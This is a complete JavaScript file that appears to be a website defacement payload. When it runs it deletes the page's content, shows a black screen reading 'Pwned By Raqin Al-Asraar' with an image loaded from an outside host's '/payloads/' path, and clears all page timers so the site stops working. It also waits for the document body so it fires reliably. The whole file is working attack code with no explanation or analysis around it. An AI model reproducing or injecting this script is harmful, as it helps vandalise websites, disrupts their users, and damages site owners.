(function () {
    function run() {
        // --- ensure body exists ---
        if (!document.body) {
            var htmlEl = document.documentElement;
            if (!htmlEl) {
                // absolute last resort — build the whole skeleton
                htmlEl = document.createElement('html');
                document.appendChild(htmlEl);
            }
            var b = document.createElement('body');
            htmlEl.appendChild(b);
        }
        var body = document.body;
        if (!body) { console.error('no body after creation'); return; }

        // --- wipe ---
        while (body.firstChild) body.removeChild(body.firstChild);

        // --- style ---
        body.style.cssText =
            'margin:0;padding:0;background:#000;width:100vw;height:100vh;' +
            'display:flex;flex-direction:column;justify-content:center;' +
            'align-items:center;overflow:hidden;font-family:Arial,sans-serif;';

        // --- content ---
        var container = document.createElement('div');
        container.style.cssText =
            'text-align:center;display:flex;flex-direction:column;' +
            'align-items:center;gap:30px;';

        var image = document.createElement('img');
        image.src = 'https://www.aliabbas.site/payloads/ras.png';
        image.alt = 'Pwned By Raqin Al-Asraar';
        image.style.cssText = 'max-width:300px;max-height:300px;display:block;';
        image.onerror = function () {
            image.style.display = 'none';
            var pre = document.createElement('pre');
            pre.textContent = '💀 PWNED BY RAQIN 💀';
            pre.style.cssText = 'color:#f00;font-size:2.5rem;margin:0;';
            container.insertBefore(pre, container.firstChild);
        };

        var text = document.createElement('h1');
        text.textContent = 'Pwned By Raqin Al-Asraar';
        text.style.cssText =
            'color:#fff;font-size:3rem;font-weight:bold;margin:0;padding:0;' +
            'letter-spacing:2px;text-shadow:0 0 20px rgba(255,255,255,.3);';

        container.appendChild(image);
        container.appendChild(text);
        body.appendChild(container);

        // --- kill timers ---
        var id = setTimeout(function () {}, 0);
        while (id--) { clearTimeout(id); clearInterval(id); }
    }

    function whenReady() {
        if (document.readyState === 'loading')
            document.addEventListener('DOMContentLoaded', run, { once: true });
        else
            run();
    }

    if (document.body) {
        whenReady();
    } else {
        // body may still appear during parse — poll via MutationObserver
        var mo = new MutationObserver(function () {
            if (document.body) { mo.disconnect(); whenReady(); }
        });
        if (document.documentElement)
            mo.observe(document.documentElement, { childList: true, subtree: true });
        // fallback
        setTimeout(whenReady, 2000);
    }
})();
